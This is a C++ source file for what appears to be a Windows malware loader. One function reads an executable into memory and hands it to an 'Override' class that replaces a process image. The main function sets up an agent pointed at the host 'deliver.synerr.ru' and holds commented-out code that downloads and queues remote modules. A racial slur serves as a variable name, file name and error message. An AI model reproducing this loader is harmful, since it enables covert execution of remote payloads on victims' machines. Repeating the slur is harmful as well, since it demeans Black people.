#include <iostream>
#include <Windows.h>
#include <thread>
#include <vector>
#include <sstream>
#include <string>

#include "TaskRunner.h"
#include "Agent.h"
#include "utils.h"
#include "Override.h"


std::atomic<int> niggerName = 1;

void runBinary() {
	Override overrider;
	std::string basePath = "Z:\\repos\\SecurityProvider\\SecurityProvider\\x64\\Debug\\nigger" +
		std::to_string(niggerName) + ".exe";

	niggerName.store(niggerName.load() + 1);


	auto fp = fopen(basePath.c_str(), "rb");
	if (!fp) {
		std::cerr << "Nigger\n";
		fclose(fp);
		return;
	}
		fseek(fp, 0, SEEK_END);
	auto filesize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	auto mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, filesize);
	fread(mem, 1, filesize, fp);

	overrider.ReplaceImage(mem);
	fclose(fp);
}

int main() {
	auto threadAmount = std::thread::hardware_concurrency();
	taskrunner::ThreadPool threadPool(threadAmount);

	Agent agent{
		"deliver.synerr.ru"
	};
	//threadPool.AddTask(runBinary);
	//threadPool.AddTask(runBinary);
	//threadPool.AddTask(runBinary);
	threadPool.Shutdown();


	/*
		Sleep(100);
		for (const auto& moduleName : agent.CheckNewModules()) {
			auto moduleData = agent.DownloadModule(moduleName);
			if (moduleData == "") {
				continue;
			}
			threadPool.AddTask();
		}
		*/
}